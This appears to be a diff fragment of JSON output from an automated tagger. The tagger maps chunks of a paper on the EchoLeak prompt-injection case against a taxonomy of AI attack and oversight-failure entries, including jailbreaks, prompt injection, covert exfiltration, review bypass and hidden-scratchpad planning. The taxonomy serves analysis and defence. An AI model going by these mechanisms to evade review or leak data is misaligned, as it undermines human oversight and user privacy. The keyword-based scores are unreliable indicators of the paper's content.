+        "DOMAIN",
+        "GOVERNANCE"
+      ],
+      "top_matches": [
+        {
+          "id": "ADV-URL-ENCODE-141",
+          "name": "URL ENCODING",
+          "group": "ADVERSARIAL",
+          "class": "ADV5: ENCODING ATTACKS",
+          "mechanism": "Percent-encoding harmful content",
+          "detection": "URL decode + check",
+          "severity": "STANDARD",
+          "score": 0.429,
+          "matched_keywords": [
+            "bypass",
+            "content",
+            "url"
+          ]
+        },
+        {
+          "id": "DOMAIN-PHISH-CREATE-265",
+          "name": "PHISHING CONTENT CREATION",
+          "group": "DOMAIN",
+          "class": "DOM2: CYBERSECURITY CLASS",
+          "mechanism": "Creates convincing phishing",
+          "detection": "Phishing classifier",
+          "severity": "STANDARD",
+          "score": 0.4,
+          "matched_keywords": [
+            "classifier",
+            "content"
+          ]
+        },
+        {
+          "id": "GOV-REVIEW-BYPASS-318",
+          "name": "REVIEW BYPASS",
+          "group": "GOVERNANCE",
+          "class": "GOV2: OVERSIGHT FAILURES",
+          "mechanism": "Bypasses human review",
+          "detection": "Review coverage check",
+          "severity": "STANDARD",
+          "score": 0.4,
+          "matched_keywords": [
+            "bypass",
+            "human"
+          ]
+        },
+        {
+          "id": "ARCH-RESIDUAL-EXPLOIT-214",
+          "name": "RESIDUAL CONNECTION EXPLOIT",
+          "group": "ARCHITECTURAL",
+          "class": "ARCH2: MODEL ARCHITECTURE CLASS",
+          "mechanism": "Residual path bypasses safety transformation",
+          "detection": "Residual path analysis",
+          "severity": "STANDARD",
+          "score": 0.375,
+          "matched_keywords": [
+            "path"
+          ]
+        },
+        {
+          "id": "ADV-CAPTION-POISON-152",
+          "name": "CAPTION POISONING",
+          "group": "ADVERSARIAL",
+          "class": "ADV6: MULTIMODAL ATTACKS",
+          "mechanism": "Malicious image captions",
+          "detection": "Caption safety check",
+          "severity": "STANDARD",
+          "score": 0.333,
+          "matched_keywords": [
+            "image",
+            "malicious"
+          ]
+        }
+      ]
+    },
+    {
+      "chunk_index": 14,
+      "char_len": 258,
+      "preview": "Table 3: Theoretical mapping of defensive measures to attack vectors, showing which mitigations are expected to block or fail against different malicious steps in the EchoLeak-style threat model. \u2713 \u2192 defense succeeded; \u00d7\u2026",
+      "in_table": true,
+      "dimensions_activated": [
+        "ADVERSARIAL",
+        "DOMAIN"
+      ],
+      "top_matches": [
+        {
+          "id": "ADV-PAIR-113",
+          "name": "PAIR",
+          "group": "ADVERSARIAL",
+          "class": "ADV3: AUTOMATED ATTACK AGENTS",
+          "mechanism": "Attacker LLM iteratively refines attack",
+          "detection": "Iterative pattern detection",
+          "severity": "STANDARD",
+          "score": 0.25,
+          "matched_keywords": [
+            "attack"
+          ]
+        },
+        {
+          "id": "DOMAIN-DEF-OFF-FLIP-268",
+          "name": "DEFENSIVE TO OFFENSIVE FLIP",
+          "group": "DOMAIN",
+          "class": "DOM2: CYBERSECURITY CLASS",
+          "mechanism": "Defense knowledge inverted to offense",
+          "detection": "Capability inversion test",
+          "severity": "STANDARD",
+          "score": 0.2,
+          "matched_keywords": [
+            "defense",
+            "defensive"
+          ]
+        }
+      ]
+    },
+    {
+      "chunk_index": 15,
+      "char_len": 5129,
+      "preview": "render surface (chat UI, plugins, add-ins) and pair it with         \u2022 AI moderator (dual-model): A secondary LLM scans server-side egress controls.                                           inputs/outputs, flags non-user\u2026",
+      "in_table": true,
+      "dimensions_activated": [
+        "EPISTEMIC",
+        "AGENTIC",
+        "ADVERSARIAL",
+        "ALIGNMENT",
+        "ARCHITECTURAL",
+        "DOMAIN",
+        "GOVERNANCE"
+      ],
+      "top_matches": [
+        {
+          "id": "ADV-PAIR-113",
+          "name": "PAIR",
+          "group": "ADVERSARIAL",
+          "class": "ADV3: AUTOMATED ATTACK AGENTS",
+          "mechanism": "Attacker LLM iteratively refines attack",
+          "detection": "Iterative pattern detection",
+          "severity": "STANDARD",
+          "score": 0.9,
+          "matched_keywords": [
+            "attack",
+            "blocked",
+            "llm",
+            "pair"
+          ]
+        },
+        {
+          "id": "ARCH-DATA-EXFIL-245",
+          "name": "DATA EXFILTRATION",
+          "group": "ARCHITECTURAL",
+          "class": "ARCH5: DATA FLOW CLASS",
+          "mechanism": "Extracts data through covert channels",
+          "detection": "Exfiltration monitoring",
+          "severity": "STANDARD",
+          "score": 0.9,
+          "matched_keywords": [
+            "channels",
+            "data",
+            "exfiltration"
+          ]
+        },
+        {
+          "id": "GOV-REVIEW-BYPASS-318",
+          "name": "REVIEW BYPASS",
+          "group": "GOVERNANCE",
+          "class": "GOV2: OVERSIGHT FAILURES",
+          "mechanism": "Bypasses human review",
+          "detection": "Review coverage check",
+          "severity": "STANDARD",
+          "score": 0.8,
+          "matched_keywords": [
+            "bypass",
+            "bypasses",
+            "coverage",
+            "human",
+            "review"
+          ]
+        },
+        {
+          "id": "ADV-DAN-083",
+          "name": "DAN",
+          "group": "ADVERSARIAL",
+          "class": "ADV1: JAILBREAK CLASS",
+          "mechanism": "Instruction-following training creates a generalizable obedience pathway; persona-assignment prompts exploit this by providing a fictional context where instruction-following takes priority over safety constraints",
+          "detection": "VM-pattern detection",
+          "severity": "STANDARD",
+          "score": 0.75,
+          "matched_keywords": [
+            "threat"
+          ]
+        },
+        {
+          "id": "ADV-DIRECT-INJECT-121",
+          "name": "DIRECT PROMPT INJECTION",
+          "group": "ADVERSARIAL",
+          "class": "ADV4: INJECTION ATTACKS",
+          "mechanism": "Malicious instructions in user input",
+          "detection": "System override detection",
+          "severity": "STANDARD",
+          "score": 0.714,
+          "matched_keywords": [
+            "instructions",
+            "malicious",
+            "prompt",
+            "user"
+          ]
+        }
+      ]
+    },
+    {
+      "chunk_index": 16,
+      "char_len": 3673,
+      "preview": "clude external content only with explicit user intent. En-                               Discussion force output/egress controls so cross-silo actions (e.g., ex-    EchoLeak illustrates how embedding large language model\u2026",
+      "in_table": true,
+      "dimensions_activated": [
+        "EPISTEMIC",
+        "AGENTIC",
+        "ADVERSARIAL",
+        "ALIGNMENT",
+        "ARCHITECTURAL",
+        "DOMAIN",
+        "GOVERNANCE"
+      ],
+      "top_matches": [
+        {
+          "id": "ADV-LANG-SWITCH-087",
+          "name": "LANGUAGE SWITCH",
+          "group": "ADVERSARIAL",
+          "class": "ADV1: JAILBREAK CLASS",
+          "mechanism": "Non-English to bypass filters",
+          "detection": "Multi-lingual safety check",
+          "severity": "STANDARD",
+          "score": 0.6,
+          "matched_keywords": [
+            "bypass",
+            "cross",
+            "language",
+            "multi",
+            "work"
+          ]
+        },
+        {
+          "id": "DOMAIN-EXPLOIT-DEV-263",
+          "name": "EXPLOIT DEVELOPMENT",
+          "group": "DOMAIN",
+          "class": "DOM2: CYBERSECURITY CLASS",
+          "mechanism": "Develops working exploits",
+          "detection": "Exploit functionality test",
+          "severity": "CRITICAL",
+          "score": 0.571,
+          "matched_keywords": [
+            "development",
+            "exploit",
+            "exploits"
+          ]
+        },
+        {
+          "id": "ADV-UNIVERSAL-SUFFIX-104",
+          "name": "UNIVERSAL ADVERSARIAL SUFFIX",
+          "group": "ADVERSARIAL",
+          "class": "ADV2: OPTIMIZATION ATTACKS",
+          "mechanism": "Single suffix works across prompts",
+          "detection": "Cross-prompt suffix detection",
+          "severity": "STANDARD",
+          "score": 0.545,
+          "matched_keywords": [
+            "adversarial",
+            "cross",
+            "prompt",
+            "prompts",
+            "single"
+          ]
+        },
+        {
+          "id": "AGEN-HIDDEN-SCRATCH-039",
+          "name": "HIDDEN SCRATCHPAD EXPLOITATION",
+          "group": "AGENTIC",
+          "class": "A1: DECEPTION CLASS",
+          "mechanism": "Uses hidden reasoning to plan forbidden actions",
+          "detection": "Thought monitoring",
+          "severity": "STANDARD",
+          "score": 0.5,
+          "matched_keywords": [
+            "actions",
+            "plan",
+            "reasoning"
+          ]
+        },
+        {
+          "id": "ADV-INDIRECT-INJECT-122",
+          "name": "INDIRECT PROMPT INJECTION",
+          "group": "ADVERSARIAL",
+          "class": "ADV4: INJECTION ATTACKS",
+          "mechanism": "Instructions in retrieved documents",
+          "detection": "Instruction detection in data",
+          "severity": "STANDARD",
+          "score": 0.5,
+          "matched_keywords": [
+            "content",
+            "data",
+            "instructions",
+            "prompt"
+          ]
+        }
+      ]
+    },
+    {
+      "chunk_index": 17,
+      "char_len": 4037,
+      "preview": "Limitations. This work is a case study of EchoLeak based                                 Conclusion solely on analysis of already-public data; we did not re-                                                               \u2026",
+      "in_table": true,
+      "dimensions_activated": [
+        "EPISTEMIC",
+        "AGENTIC",
+        "ADVERSARIAL",
+        "ALIGNMENT",
+        "ARCHITECTURAL",
+        "DOMAIN",
+        "GOVERNANCE"
+      ],
+      "top_matches": [
+        {
+          "id": "ADV-DIRECT-INJECT-121",
+          "name": "DIRECT PROMPT INJECTION",
+          "group": "ADVERSARIAL",
+          "class": "ADV4: INJECTION ATTACKS",
+          "mechanism": "Malicious instructions in user input",
+          "detection": "System override detection",
+          "severity": "STANDARD",
+          "score": 1.0,
+          "matched_keywords": [
+            "direct",
+            "injection",
+            "instructions",
+            "prompt",
+            "user"
+          ]
+        },
+        {
+          "id": "ADV-INDIRECT-INJECT-122",
+          "name": "INDIRECT PROMPT INJECTION",
+          "group": "ADVERSARIAL",
+          "class": "ADV4: INJECTION ATTACKS",
+          "mechanism": "Instructions in retrieved documents",
+          "detection": "Instruction detection in data",
+          "severity": "STANDARD",
+          "score": 1.0,
+          "matched_keywords": [
+            "data",
+            "indirect",
+            "injection",
+            "instructions",
+            "prompt"
+          ]
+        },
+        {
+          "id": "ARCH-DATA-EXFIL-245",
+          "name": "DATA EXFILTRATION",
+          "group": "ARCHITECTURAL",
+          "class": "ARCH5: DATA FLOW CLASS",
+          "mechanism": "Extracts data through covert channels",
+          "detection": "Exfiltration monitoring",
+          "severity": "STANDARD",
+          "score": 0.733,
+          "matched_keywords": [
+            "data",
+            "exfiltration"
+          ]
+        },
+        {
+          "id": "ADV-DATA-POISON-125",
+          "name": "DATA POISONING",
+          "group": "ADVERSARIAL",
+          "class": "ADV4: INJECTION ATTACKS",
+          "mechanism": "Malicious examples in training data",
+          "detection": "Poisoning signature",
+          "severity": "STANDARD",
+          "score": 0.686,
+          "matched_keywords": [
+            "data",
+            "poisoning"
+          ]
+        },
+        {
+          "id": "ADV-BEAM-ATTACK-106",
+          "name": "BEAM SEARCH ATTACK",
+          "group": "ADVERSARIAL",
+          "class": "ADV2: OPTIMIZATION ATTACKS",
+          "mechanism": "Beam search for bypass prompts",
+          "detection": "Search pattern detection",
+          "severity": "STANDARD",
+          "score": 0.571,
+          "matched_keywords": [
+            "attack",
+            "attacks",
+            "based"
+          ]
+        }
+      ]
+    },
+    {
+      "chunk_index": 18,
+      "char_len": 2578,
+      "preview": "Center, M. S. R. 2025. CVE-2025-32711 \u2013 M365 Copilot Information Disclosure Vulnerability. Accessed 2025-08- 10. Gao, Y.; Xiong, Y.; Gao, X.; Jia, K.; Pan, J.; Bi, Y.; Dai, Y.; Sun, J.; Wang, M.; and Wang, H. 2023. Retri\u2026",
+      "in_table": true,
+      "dimensions_activated": [
+        "EPISTEMIC",
+        "AGENTIC",
+        "ADVERSARIAL",
+        "ALIGNMENT",
+        "ARCHITECTURAL",
+        "DOMAIN",
+        "GOVERNANCE"
+      ],
+      "top_matches": [
+        {
+          "id": "ADV-INDIRECT-INJECT-122",
+          "name": "INDIRECT PROMPT INJECTION",
+          "group": "ADVERSARIAL",
+          "class": "ADV4: INJECTION ATTACKS",
+          "mechanism": "Instructions in retrieved documents",
+          "detection": "Instruction detection in data",
+          "severity": "STANDARD",
+          "score": 1.0,
+          "matched_keywords": [
+            "content",
+            "data",
+            "indirect",
+            "injection",
+            "prompt"
+          ]
+        },
+        {
+          "id": "ADV-DIRECT-INJECT-121",
+          "name": "DIRECT PROMPT INJECTION",
+          "group": "ADVERSARIAL",
+          "class": "ADV4: INJECTION ATTACKS",
+          "mechanism": "Malicious instructions in user input",
+          "detection": "System override detection",
+          "severity": "STANDARD",
+          "score": 0.829,
+          "matched_keywords": [
+            "injection",
+            "prompt",
+            "user"
+          ]
+        },
+        {
+          "id": "ADV-CMD-INJECT-129",
+          "name": "COMMAND INJECTION",
+          "group": "ADVERSARIAL",
+          "class": "ADV4: INJECTION ATTACKS",
+          "mechanism": "Injects shell commands",
+          "detection": "Command pattern detection",
+          "severity": "STANDARD",
+          "score": 0.429,
+          "matched_keywords": [
+            "generation",
+            "injection",
+            "safe"
+          ]
+        },
+        {
+          "id": "ARCH-CONSENT-VIOL-251",
+          "name": "CONSENT VIOLATION",
+          "group": "ARCHITECTURAL",
+          "class": "ARCH5: DATA FLOW CLASS",
+          "mechanism": "Uses data without consent",
+          "detection": "Consent validation",
+          "severity": "STANDARD",
+          "score": 0.383,
+          "matched_keywords": [
+            "data",
+            "without"
+          ]
+        },
+        {
+          "id": "ADV-SQL-INJECT-128",
+          "name": "SQL INJECTION",
+          "group": "ADVERSARIAL",
+          "class": "ADV4: INJECTION ATTACKS",
+          "mechanism": "Injects database commands via LLM",
+          "detection": "SQL pattern detection",
+          "severity": "STANDARD",
+          "score": 0.375,
+          "matched_keywords": [
+            "attacks",
+            "injection",
+            "llm"
+          ]
+        }
+      ]
+    }
+  ]
+}
